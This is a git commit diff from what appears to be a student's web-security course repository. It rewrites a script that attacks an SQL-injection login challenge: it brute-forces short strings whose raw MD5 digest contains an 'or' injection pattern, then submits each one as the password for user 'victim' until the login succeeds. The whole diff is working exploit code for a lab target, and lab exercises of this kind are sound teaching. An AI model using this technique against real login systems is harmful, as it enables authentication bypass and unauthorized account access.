773672d4c5928773f905473204d701f381574e47
ele906 <eleanorliu8@gmail.com>
2026-03-31 16:59:24 -0400

    bro wtf

--- cos432-websec/part1/sql_2.py
+++ cos432-websec/part1/sql_2.py
@@ -1,29 +1,27 @@
+import hashlib
 import requests
-import urllib.parse
+import itertools
+import string
 
 TARGET = "https://elecos432.org/sqlinject2/"
-USERNAME = "victim"
 
-candidates = [
-    "ffifdyop"
-]
+def raw_md5(s):
+    return hashlib.md5(s.encode()).digest()
 
-def worked(text: str) -> bool:
-    t = text.lower()
-    return "login successful" in t
+def is_injectable(d):
+    for i in range(1, 10):
+        if f"'or'{i}".encode() in d or f"'||'{i}".encode() in d:
+            return True
+    return False
 
-for password in candidates:
-    r = requests.post(TARGET, data={
-        "username": USERNAME,
-        "password": password,
-    }, timeout=10)
-
-    print(f"trying {password!r}")
-
-    if worked(r.text):
-        print("FOUND:")
-        print(urllib.parse.urlencode({
-            "username": USERNAME,
-            "password": password,
-        }))
-        break
+chars = string.ascii_lowercase + string.digits
+for length in range(1, 9):
+    for tup in itertools.product(chars, repeat=length):
+        password = "".join(tup)
+        d = raw_md5(password)
+        if is_injectable(d):
+            print(f"Found: {password}, hex: {d.hex()}")
+            r = requests.post(TARGET, data={"username": "victim", "password": password})
+            if "successful" in r.text.lower():
+                print("SUCCESS!", r.text[:300])
+                exit()
